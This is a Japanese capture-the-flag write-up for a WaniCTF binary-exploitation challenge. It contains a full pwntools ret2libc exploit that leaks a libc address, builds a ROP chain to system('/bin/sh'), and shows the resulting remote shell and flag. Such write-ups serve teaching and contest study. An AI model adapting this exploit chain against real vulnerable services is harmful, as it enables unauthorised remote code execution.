# one gadget rce:PWN:113pts
nc rce.wanictf.org 9007  
- ROPを使ったlibcのロードアドレスのリークを理解する必要があります。  
- libc上にあるone gadget RCE (Remote Code Execution)の探し方と呼び出し方を理解する必要があります。  
- one_gadget libc-2.27.so  

使用ツール例  
- [pwntools](https://github.com/wani-hackase/memo-setup-pwn-utils#pwntools)  
- [objdump](https://github.com/wani-hackase/memo-setup-pwn-utils#objdump)  
- [ROPgadget](https://github.com/wani-hackase/memo-setup-pwn-utils#ROPgadget)  
- [one_gadget](https://github.com/wani-hackase/memo-setup-pwn-utils#one_gadget)  

セキュリティ保護  
- Partial RELocation ReadOnly (RELRO)  
- Stack Smash Protection (SSP)無効  
- No eXecute bit(NX)有効  
- Position Independent Executable (PIE)無効  

[pwn07](pwn07)　　　　[pwn07.c](pwn07.c)　　　　[libc-2.27.so](libc-2.27.so)  

# Solution
ret2libcを行えば良さそうだ。  
以下のpwnpwn07.pyで行う。  
```python:pwnpwn07.py
from pwn import *

elf = ELF('./pwn07')
libc = ELF('./libc-2.27.so')
io = remote("rop.wanictf.org", 9007)
#io = process(elf.path)
rop = ROP(elf)

puts_plt = elf.plt['puts']
main = elf.symbols['main']
libc_start_main = elf.symbols['__libc_start_main']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(puts_plt))
log.info("__libc_start_main: " + hex(libc_start_main))
log.info("pop rdi gadget: " + hex(pop_rdi))

base = b'A' * 22
io.recvline()
payload = base + p64(pop_rdi) + p64(libc_start_main) + p64(puts_plt) + p64(main)
io.sendline(payload)
for i in range(12):
    io.recvline()
recieved = io.recvline().strip().replace(b"\n", b"")
io.recvline()

leak = u64(recieved.ljust(8, b'\x00'))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))
libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

binsh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

log.info("/bin/sh %s " % hex(binsh))
log.info("system %s " % hex(system))

payload = base + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendline(payload)
io.interactive()
```
実行する。  
```bash
$ python pwnpwn07.py
[*] '/pwn07'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to rop.wanictf.org on port 9007: Done
[*] Loaded 14 cached gadgets for './pwn07'
[*] puts@plt: 0x400650
[*] __libc_start_main: 0x600ff0
[*] pop rdi gadget: 0x400a13
[*] Leaked libc address,  __libc_start_main: 0x7fd35b407b10
[*] Address of libc 0x7fd35b3e6000
[*] /bin/sh 0x7fd35b599e1a
[*] system 0x7fd35b435550
[*] Switching to interactive mode
What's your name?: hello AAAAAAAAAA7!

***start stack dump***
0x7ffc837c4990: 0x41414141414149b0 <- rsp
0x7ffc837c4998: 0x0000003741414141
0x7ffc837c49a0: 0x4141414141414141 <- rbp
0x7ffc837c49a8: 0x0000000000400626 <- return address
0x7ffc837c49b0: 0x0000000000400a13
0x7ffc837c49b8: 0x00007fd35b599e1a
0x7ffc837c49c0: 0x00007fd35b435550
***end stack dump***

$ ls
chall
flag.txt
redir.sh
$ cat flag.txt
FLAG{mem0ry-1eak-4nd-0ne-gadget-rem0te-ce}
$
[*] Interrupted
```
flagが得られた。  

## FLAG{mem0ry-1eak-4nd-0ne-gadget-rem0te-ce}